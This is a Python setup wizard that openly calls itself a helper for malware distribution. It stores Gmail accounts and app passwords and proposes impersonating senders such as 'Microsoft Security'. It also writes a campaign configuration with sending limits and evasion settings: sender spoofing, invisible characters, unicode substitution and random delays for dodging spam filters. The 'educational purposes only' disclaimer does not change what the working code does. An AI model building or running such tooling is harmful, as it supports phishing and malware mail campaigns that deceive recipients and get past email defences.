#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Gmail Setup Helper for Malware Distribution
WARNING: This is for educational purposes only!
"""

import os
import json
import smtplib
import ssl
from email.mime.text import MIMEText

class GmailSetup:
    def __init__(self):
        self.config_file = "gmail_accounts.json"
        self.accounts = []
    
    def load_accounts(self):
        """Load existing Gmail accounts"""
        try:
            with open(self.config_file, 'r') as f:
                self.accounts = json.load(f)
            print(f"Loaded {len(self.accounts)} Gmail accounts")
        except FileNotFoundError:
            print("No existing accounts found. Creating new configuration.")
            self.accounts = []
    
    def save_accounts(self):
        """Save Gmail accounts to file"""
        with open(self.config_file, 'w') as f:
            json.dump(self.accounts, f, indent=2)
        print(f"Saved {len(self.accounts)} accounts to {self.config_file}")
    
    def add_gmail_account(self):
        """Add a new Gmail account"""
        print("\n" + "="*50)
        print("ADDING NEW GMAIL ACCOUNT")
        print("="*50)
        
        email = input("Enter Gmail address: ")
        password = input("Enter Gmail app password: ")
        display_name = input("Enter display name (e.g., 'Microsoft Security'): ")
        
        # Test the account
        if self.test_gmail_account(email, password):
            account = {
                "email": email,
                "password": password,
                "display_name": display_name,
                "active": True,
                "daily_limit": 100,
                "emails_sent_today": 0
            }
            
            self.accounts.append(account)
            self.save_accounts()
            print(f"✓ Gmail account added successfully: {email}")
        else:
            print(f"✗ Failed to authenticate Gmail account: {email}")
    
    def test_gmail_account(self, email, password):
        """Test Gmail account authentication"""
        try:
            print(f"Testing Gmail account: {email}")
            
            # Create test message
            msg = MIMEText("This is a test message from the Gmail distributor setup.")
            msg['From'] = email
            msg['To'] = email
            msg['Subject'] = "Gmail Distributor Test"
            
            # Test SMTP connection
            context = ssl.create_default_context()
            with smtplib.SMTP("smtp.gmail.com", 587) as server:
                server.starttls(context=context)
                server.login(email, password)
                server.send_message(msg)
            
            print("✓ Gmail account authentication successful")
            return True
            
        except Exception as e:
            print(f"✗ Gmail authentication failed: {e}")
            return False
    
    def setup_app_password_guide(self):
        """Display guide for setting up Gmail app password"""
        print("\n" + "="*60)
        print("GMAIL APP PASSWORD SETUP GUIDE")
        print("="*60)
        print("""
To use Gmail for automated email sending, you need to create an App Password:

1. Go to your Google Account settings
2. Click on "Security" in the left sidebar
3. Under "Signing in to Google", click "App passwords"
4. Select "Mail" as the app
5. Select "Other" as the device and enter "Malware Distributor"
6. Click "Generate"
7. Copy the 16-character password (it will look like: abcd efgh ijkl mnop)
8. Use this password in the distributor (not your regular Gmail password)

IMPORTANT NOTES:
- You must have 2-Factor Authentication enabled on your Gmail account
- The app password is different from your regular Gmail password
- Keep the app password secure and don't share it
- You can revoke app passwords anytime from your Google Account settings
        """)
    
    def list_accounts(self):
        """List all configured Gmail accounts"""
        if not self.accounts:
            print("No Gmail accounts configured.")
            return
        
        print("\n" + "="*60)
        print("CONFIGURED GMAIL ACCOUNTS")
        print("="*60)
        
        for i, account in enumerate(self.accounts, 1):
            status = "ACTIVE" if account.get('active', True) else "INACTIVE"
            print(f"{i}. {account['email']}")
            print(f"   Display Name: {account.get('display_name', 'N/A')}")
            print(f"   Status: {status}")
            print(f"   Daily Limit: {account.get('daily_limit', 100)}")
            print(f"   Sent Today: {account.get('emails_sent_today', 0)}")
            print()
    
    def edit_account(self):
        """Edit an existing Gmail account"""
        if not self.accounts:
            print("No accounts to edit.")
            return
        
        self.list_accounts()
        
        try:
            choice = int(input("Enter account number to edit: ")) - 1
            if 0 <= choice < len(self.accounts):
                account = self.accounts[choice]
                
                print(f"\nEditing account: {account['email']}")
                print("1. Change display name")
                print("2. Change daily limit")
                print("3. Toggle active status")
                print("4. Test account")
                
                edit_choice = input("Enter choice: ")
                
                if edit_choice == "1":
                    new_name = input("Enter new display name: ")
                    account['display_name'] = new_name
                    print("Display name updated.")
                
                elif edit_choice == "2":
                    new_limit = int(input("Enter new daily limit: "))
                    account['daily_limit'] = new_limit
                    print("Daily limit updated.")
                
                elif edit_choice == "3":
                    account['active'] = not account.get('active', True)
                    status = "activated" if account['active'] else "deactivated"
                    print(f"Account {status}.")
                
                elif edit_choice == "4":
                    if self.test_gmail_account(account['email'], account['password']):
                        print("Account test successful.")
                    else:
                        print("Account test failed.")
                
                self.save_accounts()
            else:
                print("Invalid account number.")
                
        except ValueError:
            print("Invalid input.")
    
    def delete_account(self):
        """Delete a Gmail account"""
        if not self.accounts:
            print("No accounts to delete.")
            return
        
        self.list_accounts()
        
        try:
            choice = int(input("Enter account number to delete: ")) - 1
            if 0 <= choice < len(self.accounts):
                account = self.accounts[choice]
                confirm = input(f"Are you sure you want to delete {account['email']}? (y/N): ")
                
                if confirm.lower() == 'y':
                    del self.accounts[choice]
                    self.save_accounts()
                    print("Account deleted.")
                else:
                    print("Deletion cancelled.")
            else:
                print("Invalid account number.")
                
        except ValueError:
            print("Invalid input.")
    
    def create_distribution_config(self):
        """Create distribution configuration file"""
        config = {
            "gmail_settings": {
                "smtp_server": "smtp.gmail.com",
                "smtp_port": 587,
                "use_tls": True,
                "use_ssl": False
            },
            "campaign_settings": {
                "emails_per_hour": 15,
                "max_emails_per_day": 200,
                "delay_between_emails": "30-120 seconds",
                "retry_failed_emails": True,
                "max_retries": 3
            },
            "accounts": self.accounts,
            "evasion_techniques": {
                "email_headers": {
                    "add_custom_headers": True,
                    "spoof_sender": True,
                    "use_legitimate_domains": True
                },
                "content_obfuscation": {
                    "use_html_encoding": True,
                    "add_invisible_characters": True,
                    "use_unicode_substitution": True
                },
                "timing_evasion": {
                    "random_delays": True,
                    "business_hours_only": False,
                    "avoid_weekends": False
                }
            }
        }
        
        with open("gmail_distribution_config.json", 'w') as f:
            json.dump(config, f, indent=2)
        
        print("Distribution configuration created: gmail_distribution_config.json")
    
    def run_setup_wizard(self):
        """Run the setup wizard"""
        print("="*60)
        print("GMAIL DISTRIBUTOR SETUP WIZARD")
        print("="*60)
        print("WARNING: This is for educational purposes only!")
        print("="*60)
        
        self.load_accounts()
        
        while True:
            print("\n" + "="*40)
            print("GMAIL SETUP MENU")
            print("="*40)
            print("1. Setup App Password Guide")
            print("2. Add Gmail Account")
            print("3. List Accounts")
            print("4. Edit Account")
            print("5. Delete Account")
            print("6. Test All Accounts")
            print("7. Create Distribution Config")
            print("8. Exit")
            
            choice = input("\nEnter your choice: ")
            
            if choice == "1":
                self.setup_app_password_guide()
            
            elif choice == "2":
                self.add_gmail_account()
            
            elif choice == "3":
                self.list_accounts()
            
            elif choice == "4":
                self.edit_account()
            
            elif choice == "5":
                self.delete_account()
            
            elif choice == "6":
                self.test_all_accounts()
            
            elif choice == "7":
                self.create_distribution_config()
            
            elif choice == "8":
                print("Setup complete. Goodbye!")
                break
            
            else:
                print("Invalid choice. Please try again.")
    
    def test_all_accounts(self):
        """Test all configured accounts"""
        if not self.accounts:
            print("No accounts to test.")
            return
        
        print("\nTesting all Gmail accounts...")
        
        for account in self.accounts:
            if account.get('active', True):
                print(f"\nTesting: {account['email']}")
                if self.test_gmail_account(account['email'], account['password']):
                    print("✓ Account working")
                else:
                    print("✗ Account failed")
            else:
                print(f"\nSkipping inactive account: {account['email']}")

def main():
    """Main execution function"""
    setup = GmailSetup()
    setup.run_setup_wizard()

if __name__ == "__main__":
    main()

